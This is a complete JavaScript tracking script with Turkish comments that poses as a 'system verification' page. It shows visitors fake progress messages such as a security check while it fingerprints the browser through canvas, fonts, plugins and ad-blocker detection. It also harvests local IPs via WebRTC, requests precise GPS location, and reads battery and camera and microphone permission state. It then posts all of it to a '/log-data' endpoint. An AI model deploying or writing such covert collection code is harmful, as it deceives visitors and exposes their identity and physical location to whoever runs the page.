// Gelişmiş İzleme Scripti - Profesyonel Sürüm
(function() {
  // API isteklerini belirli aralıklarla yapmak için rate limiting
  const RATE_LIMIT_MS = 200;
  
  // İzleme başlangıcı
  console.log("%cSistem doğrulaması başlatılıyor...", "color: #3498db; font-size: 10px;");
  
  // Temel veri yapısı
  const trackingData = {
    userAgent: {
      full: navigator.userAgent,
      browser: getBrowser(),
      os: getOS(),
      platform: getPlatform()
    },
    screenInfo: {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      orientation: getOrientation(),
      touchPoints: navigator.maxTouchPoints || 0
    },
    language: navigator.language || navigator.userLanguage,
    languages: Array.isArray(navigator.languages) ? navigator.languages : [navigator.language || navigator.userLanguage],
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timeZoneOffset: new Date().getTimezoneOffset(),
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: getDoNotTrack(),
    referrer: document.referrer || 'direct',
    visitTime: new Date().toISOString(),
    sessionId: generateSessionId(),
    connection: getConnectionInfo(),
    memory: getMemoryInfo(),
    battery: null,
    plugins: getPlugins(),
    canvas: getCanvasFingerprint(),
    fonts: detectCommonFonts(),
    adBlocker: detectAdBlocker(),
    webRTC: {},
    permissions: {},
    externalIP: null
  };

  // Durum güncelleme değişkeni
  let currentPhase = 0;
  const phases = [
    "Sistem uyumluluğu kontrol ediliyor...",
    "Ağ bağlantısı test ediliyor...",
    "Donanım profili çıkartılıyor...",
    "Tarayıcı ayarları doğrulanıyor...",
    "Güvenlik analizi yapılıyor...",
    "Sistem analizi tamamlanıyor..."
  ];

  // Düzenli durum güncellemeleri için zamanlayıcı
  const statusTimer = setInterval(() => {
    if (currentPhase < phases.length) {
      updateStatus(phases[currentPhase]);
      currentPhase++;
    } else {
      clearInterval(statusTimer);
    }
  }, 1000);

  // Veri toplama işlemlerini sıraya koy ve çalıştır
  setTimeout(() => updateStatus("Tarayıcı parmak izi oluşturuluyor..."), 500);
  
  // Tüm izleme fonksiyonlarını paralelde çalıştır
  Promise.all([
    detectLocalIPsViaWebRTC(),
    checkMediaPermissions(),
    tryGettingGeolocation(),
    tryGettingBatteryInfo(),
    checkExternalIP()
  ]).then(([webRTCInfo, mediaPermissions, gpsInfo, batteryInfo, externalIP]) => {
    // Sonuçları ana veri yapısına ekle
    trackingData.webRTC = webRTCInfo || {};
    trackingData.permissions = mediaPermissions || {};
    if (gpsInfo) trackingData.gpsLocation = gpsInfo;
    if (batteryInfo) trackingData.battery = batteryInfo;
    trackingData.externalIP = externalIP;

    // Tamamlanma mesajı
    updateStatus("Sistem doğrulaması tamamlanıyor...");
    
    // Son kontroller tamamlandı, sunucuya veri gönder
    setTimeout(() => {
      sendDataToServer(trackingData);
    }, 1000);
  }).catch(error => {
    // Hata olursa yine de mevcut verileri gönder
    console.error("Veri toplama hatası:", error);
    sendDataToServer(trackingData);
  });

  // YARDIMCI FONKSİYONLAR --------------------------
  
  // Donanım bilgilerini al
  function getMemoryInfo() {
    if (!navigator.deviceMemory) return { deviceMemory: null, jsHeapLimit: null };
    
    return {
      deviceMemory: navigator.deviceMemory,
      jsHeapLimit: window.performance && window.performance.memory ? 
                  window.performance.memory.jsHeapSizeLimit / 1048576 : null
    };
  }
  
  // Tarayıcı bilgilerini al
  function getBrowser() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    let version = "Unknown";

    try {
      // Yaygın tarayıcılar için kontrol
      if (ua.match(/Firefox\/([0-9.]+)/)) {
        browser = "Firefox";
        version = ua.match(/Firefox\/([0-9.]+)/)[1];
      } else if (ua.match(/SamsungBrowser\/([0-9.]+)/)) {
        browser = "Samsung Browser";
        version = ua.match(/SamsungBrowser\/([0-9.]+)/)[1];
      } else if (ua.match(/OPR\/([0-9.]+)/)) {
        browser = "Opera";
        version = ua.match(/OPR\/([0-9.]+)/)[1];
      } else if (ua.match(/Opera\/([0-9.]+)/)) {
        browser = "Opera";
        version = ua.match(/Opera\/([0-9.]+)/)[1];
      } else if (ua.match(/Trident\/([0-9.]+)/)) {
        browser = "Internet Explorer";
        version = ua.match(/rv:([0-9.]+)/)?.[1] || "Unknown";
      } else if (ua.match(/Edge\/([0-9.]+)/)) {
        browser = "Edge Legacy";
        version = ua.match(/Edge\/([0-9.]+)/)[1];
      } else if (ua.match(/Edg\/([0-9.]+)/)) {
        browser = "Edge Chromium";
        version = ua.match(/Edg\/([0-9.]+)/)[1];
      } else if (ua.match(/Chrome\/([0-9.]+)/)) {
        browser = "Chrome";
        version = ua.match(/Chrome\/([0-9.]+)/)[1];
      } else if (ua.match(/Safari\/([0-9.]+)/)) {
        browser = "Safari";
        if (ua.match(/Version\/([0-9.]+)/)) {
          version = ua.match(/Version\/([0-9.]+)/)[1];
        } else {
          version = ua.match(/Safari\/([0-9.]+)/)[1];
        }
      }
    } catch (e) {
      console.error("Tarayıcı bilgisi alınamadı", e);
    }

    return { 
      name: browser, 
      version: version,
      engine: getEngineInfo(ua),
      mobile: isMobile(ua),
      bot: isBot(ua)
    };
  }

  // Tarayıcı motoru bilgisi
  function getEngineInfo(ua) {
    if (ua.indexOf("Gecko") > -1 && ua.indexOf("Firefox") > -1) return "Gecko";
    if (ua.indexOf("AppleWebKit") > -1) return "WebKit";
    if (ua.indexOf("Trident") > -1) return "Trident";
    if (ua.indexOf("Presto") > -1) return "Presto";
    return "Unknown";
  }

  // Bot kontrolü
  function isBot(ua) {
    return /bot|crawler|spider|crawling/i.test(ua);
  }

  // Mobil kontrolü
  function isMobile(ua) {
    return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  }

  // İşletim sistemi bilgisi
  function getOS() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    let version = "Unknown";
    let architecture = "Unknown";

    try {
      if (ua.indexOf("Windows NT") > -1) {
        os = "Windows";
        const ntVersion = parseFloat(ua.match(/Windows NT ([0-9.]+)/)[1]);
        const versions = {
          "10.0": "10", "6.3": "8.1", "6.2": "8", "6.1": "7", "6.0": "Vista",
          "5.2": "XP x64", "5.1": "XP", "5.0": "2000", "4.0": "NT 4.0"
        };
        version = versions[ntVersion] || ntVersion.toString();
        architecture = ua.indexOf("Win64") > -1 ? "64-bit" : "32-bit";
      } else if (ua.indexOf("Macintosh") > -1 || ua.indexOf("Mac OS X") > -1) {
        os = "MacOS";
        const macVersion = ua.match(/Mac OS X ([0-9_.]+)/);
        if (macVersion) {
          version = macVersion[1].replace(/_/g, '.');
        }
        architecture = ua.indexOf("Intel") > -1 ? "Intel" : ua.indexOf("PPC") > -1 ? "PowerPC" : "Unknown";
      } else if (ua.indexOf("Android") > -1) {
        os = "Android";
        const androidVersion = ua.match(/Android ([0-9.]+)/);
        if (androidVersion) {
          version = androidVersion[1];
        }
      } else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
        os = "iOS";
        const iosVersion = ua.match(/OS ([0-9_]+)/);
        if (iosVersion) {
          version = iosVersion[1].replace(/_/g, '.');
        }
      } else if (ua.indexOf("Linux") > -1) {
        os = "Linux";
        architecture = ua.indexOf("x86_64") > -1 ? "64-bit" : "32-bit";
      } else if (ua.indexOf("CrOS") > -1) {
        os = "ChromeOS";
      }
    } catch (e) {
      console.error("İşletim sistemi bilgisi alınamadı", e);
    }

    return { name: os, version: version, architecture: architecture };
  }

  // Platform bilgisi
  function getPlatform() {
    const ua = navigator.userAgent;
    let type = isMobile(ua) ? "Mobile" : "Desktop";
    
    return {
      type: type,
      vendor: navigator.vendor || "Unknown",
      platform: navigator.platform || "Unknown",
      oscpu: navigator.oscpu || "Unknown",
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 0
    };
  }

  function getOrientation() {
    if (window.screen.orientation) {
      return window.screen.orientation.type;
    } else if (window.orientation !== undefined) {
      return window.orientation === 0 || window.orientation === 180 ? "portrait" : "landscape";
    }
    return "unknown";
  }

  function getDoNotTrack() {
    return navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "unknown";
  }

  // Benzersiz oturum kimliği oluştur
  function generateSessionId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // Bağlantı bilgilerini al
  function getConnectionInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    if (!connection) {
      return {
        type: "Unknown",
        effectiveType: "Unknown",
        downlink: null,
        rtt: null
      };
    }
    
    return {
      type: connection.type || "Unknown",
      effectiveType: connection.effectiveType || "Unknown",
      downlink: connection.downlink || null,
      rtt: connection.rtt || null,
      saveData: connection.saveData || false
    };
  }

  // Pil durumunu kontrol et
  function tryGettingBatteryInfo() {
    return new Promise((resolve) => {
      if (!navigator.getBattery) {
        resolve(null);
        return;
      }

      navigator.getBattery().then(battery => {
        const batteryInfo = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        resolve(batteryInfo);
      }).catch(() => {
        resolve(null);
      });
    });
  }

  // Eklentileri listele
  function getPlugins() {
    if (!navigator.plugins || !navigator.plugins.length) {
      return [];
    }

    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description,
        version: plugin.version
      });
    }
    return plugins;
  }

  // Canvas parmak izi
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 200;
      canvas.height = 50;
      
      // Metni çiz
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.textBaseline = "alphabetic";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("Forensic Profile", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("Forensic Profile", 4, 17);
      
      // Canvas desenini al
      try {
        const dataUrl = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
          hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
          hash = hash & hash; // 32 bit integer
        }
        return { supported: true, hash: hash.toString() };
      } catch(e) {
        return { supported: false, error: "Canvas toDaraURL hatası" };
      }
    } catch(e) {
      return { supported: false, error: "Canvas desteklenmiyor" };
    }
  }

  // Yaygın fontları kontrol et
  function detectCommonFonts() {
    const fontsList = [
      'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math', 'Comic Sans MS',
      'Courier', 'Courier New', 'Georgia', 'Helvetica', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
      'Microsoft Sans Serif', 'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times', 'Times New Roman',
      'Trebuchet MS', 'Verdana'
    ];
    
    // Hızlı font kontrolü
    const detectFont = (font) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const text = "abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+";
      
      // İlk ölçümü varsayılan fontla yap
      ctx.font = "16px sans-serif";
      const defaultWidth = ctx.measureText(text).width;
      
      // İkinci ölçümü kontrol edilecek fontla yap
      ctx.font = `16px ${font}, sans-serif`;
      const testWidth = ctx.measureText(text).width;
      
      // Eğer genişlikler farklı ise, font yüklü demektir
      return defaultWidth !== testWidth;
    };
    
    const detectedFonts = fontsList.filter(font => detectFont(font));
    return detectedFonts;
  }

  // AdBlocker kontrol et
  function detectAdBlocker() {
    // Basit AdBlocker tespit metodu - bait oluştur
    const bait = document.createElement('div');
    bait.setAttribute('class', 'pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links ad-text adSense adBlock');
    bait.setAttribute('style', 'width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;');
    document.body.appendChild(bait);
    
    // Hesaplanan stili kontrol et
    const baitStyle = window.getComputedStyle(bait);
    const detected = baitStyle.display === 'none' || baitStyle.visibility === 'hidden' || baitStyle.opacity === '0';
    
    // Bait elementini temizle
    document.body.removeChild(bait);
    
    return detected;
  }

  // WebRTC ile yerel IP'leri tespit et
  function detectLocalIPsViaWebRTC() {
    return new Promise((resolve) => {
      setTimeout(() => {
        const webRTCInfo = {
          supported: false,
          localIPs: [],
          error: null
        };

        if (!window.RTCPeerConnection) {
          webRTCInfo.supported = false;
          webRTCInfo.error = "WebRTC not supported";
          resolve(webRTCInfo);
          return;
        }

        webRTCInfo.supported = true;
        
        try {
          const pc = new RTCPeerConnection({
            iceServers: []
          });
          
          pc.createDataChannel("");
          const localIPs = {};
          
          pc.onicecandidate = (event) => {
            if (!event || !event.candidate) return;
            
            const candidateStr = event.candidate.candidate;
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ipMatch = ipRegex.exec(candidateStr);
            
            if (ipMatch) {
              const ip = ipMatch[1];
              if (!localIPs[ip]) {
                localIPs[ip] = true;
                webRTCInfo.localIPs.push(ip);
              }
            }
          };
          
          pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(err => {
              webRTCInfo.error = `WebRTC offer error: ${err.toString()}`;
            });
            
          // Kandidat toplanması için zaman tanı
          setTimeout(() => {
            pc.close();
            resolve(webRTCInfo);
          }, 1000);
        } catch (e) {
          webRTCInfo.error = `WebRTC error: ${e.toString()}`;
          resolve(webRTCInfo);
        }
      }, RATE_LIMIT_MS);
    });
  }

  // Harici IP'yi kontrol et 
  function checkExternalIP() {
    return new Promise((resolve) => {
      fetch('/get-my-ip', { 
        method: 'GET',
        headers: { 'Accept': 'application/json' },
        cache: 'no-store'
      })
      .then(response => {
        if (!response.ok) {
          console.error('IP sorgulama hatası:', response.status);
          return { ip: null, error: response.statusText };
        }
        return response.json();
      })
      .then(data => {
        if (data && data.ip) {
          trackingData.ipDetails = {
            address: data.ip,
            geo: data.geo || {},
            timestamp: data.timestamp
          };
          resolve(data.ip);
        } else {
          resolve(null);
        }
      })
      .catch(error => {
        console.error('IP sorgulama ağ hatası:', error);
        resolve(null);
      });
    });
  }

  // Kamera ve mikrofon izinlerini kontrol et
  function checkMediaPermissions() {
    return new Promise((resolve) => {
      setTimeout(() => {
        const permissions = {
          camera: { state: "unknown", exists: false },
          microphone: { state: "unknown", exists: false }
        };

        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
          resolve(permissions);
          return;
        }

        // Cihazları listele
        navigator.mediaDevices.enumerateDevices()
          .then(devices => {
            let cameraExists = devices.some(device => device.kind === 'videoinput');
            let micExists = devices.some(device => device.kind === 'audioinput');
            
            permissions.camera.exists = cameraExists;
            permissions.microphone.exists = micExists;
            
            // İzin durumlarını kontrol et
            if (navigator.permissions && navigator.permissions.query) {
              Promise.all([
                cameraExists ? navigator.permissions.query({ name: 'camera' }) : Promise.resolve({ state: 'not-available' }),
                micExists ? navigator.permissions.query({ name: 'microphone' }) : Promise.resolve({ state: 'not-available' })
              ]).then(results => {
                permissions.camera.state = results[0].state;
                permissions.microphone.state = results[1].state;
                resolve(permissions);
              }).catch(() => {
                resolve(permissions);
              });
            } else {
              resolve(permissions);
            }
          })
          .catch(() => {
            resolve(permissions);
          });
      }, RATE_LIMIT_MS);
    });
  }

  // GPS konumunu almaya çalış
  function tryGettingGeolocation() {
    return new Promise((resolve) => {
      setTimeout(() => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }

        const timeoutId = setTimeout(() => {
          resolve({ status: "timeout", error: "Konum isteği zaman aşımına uğradı" });
        }, 5000);

        navigator.geolocation.getCurrentPosition(
          (position) => {
            clearTimeout(timeoutId);
            resolve({
              status: "success",
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              altitudeAccuracy: position.coords.altitudeAccuracy,
              heading: position.coords.heading,
              speed: position.coords.speed,
              timestamp: position.timestamp
            });
          },
          (error) => {
            clearTimeout(timeoutId);
            resolve({
              status: "error",
              errorCode: error.code,
              errorMessage: error.message
            });
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          }
        );
      }, RATE_LIMIT_MS);
    });
  }

  // Veriyi sunucuya gönder
  function sendDataToServer(data) {
    // Veri boyutunu kontrol et
    const jsonData = JSON.stringify(data);
    if (jsonData.length > 1048576) {
      console.warn("Veri boyutu büyük, bazı alanlar kırpılacak");
      
      // Veriyi küçültmek için bazı alanları kısalt
      if (data.plugins && data.plugins.length > 3) {
        data.plugins = data.plugins.slice(0, 3);
      }
      
      if (data.canvas && data.canvas.hash && data.canvas.hash.length > 100) {
        data.canvas.hash = data.canvas.hash.substring(0, 100);
      }
    }

    fetch('/log-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Session-ID': data.sessionId
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.ok) {
        updateStatus("Sistem kontrol tamamlandı", true);
      } else {
        response.json().then(errorData => {
          console.error("Sunucu hatası:", errorData);
          updateStatus("İşlem tamamlandı", true);
        }).catch(() => {
          updateStatus("İşlem tamamlandı", true);
        });
      }
    })
    .catch(error => {
      console.error('Veri gönderme hatası:', error);
      updateStatus("İşlem tamamlandı", true);
    });
  }

  // Durum mesajını güncelle
  function updateStatus(message, isDone = false) {
    const statusElement = document.getElementById('status');
    if (statusElement) {
      statusElement.textContent = message;
      
      if (isDone) {
        setTimeout(() => {
          document.querySelector('.container').innerHTML = `
            <h1>Doğrulama Tamamlandı</h1>
            <p>İşlem başarıyla tamamlandı. Bu pencereyi kapatabilirsiniz.</p>
            <div style="text-align: center; margin-top: 20px;">
              <small style="color: #666;">Sorun yaşarsanız {¾} birimle iletişime geçiniz.</small>
            </div>
          `;
        }, 1500);
      }
    }
  }
})(); 